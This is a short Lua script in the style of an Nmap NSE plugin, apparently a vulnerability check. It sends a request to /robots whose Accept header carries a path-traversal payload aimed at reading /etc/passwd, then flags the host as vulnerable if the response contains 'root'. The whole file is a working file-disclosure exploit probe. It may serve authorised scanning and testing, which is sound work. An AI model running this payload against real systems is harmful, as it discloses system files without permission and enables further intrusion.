
local http = require "http"
local string = require "string"
local cms={}

portrule = function(host, port)
	if (port.state == "open" and port.protocol == "tcp") then	
		local resp= http.get(host,port, "/robots")
		if resp.status==200 then
			if resp.body ~= nil then
				return true
			end
		end

	return false

	end
end

action= function (host,port) 
	
	http.useragent="Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
	
	local option ={} --tabella per opzioni nell'header
	option['header']={}
	option['header']['Accept-Language']='en-US,en;q=0.5'
	option['header']['Accept']='../../../../../../../../etc/passwd{{' --payload for /etc/passwd
	option['timeout']='10000'

	local resp = http.generic_request(host,port,'GET','/robots',option)
	
	if(resp.status == 200 and resp.body ~= nil ) then
		if (string.find(resp.body,'root')) then
		cms['VULNERABLE']='YES'
		cms['PATH']='/etc/passwd'
		return cms
		end
	end
return 'NOT VULNERABLE'
end


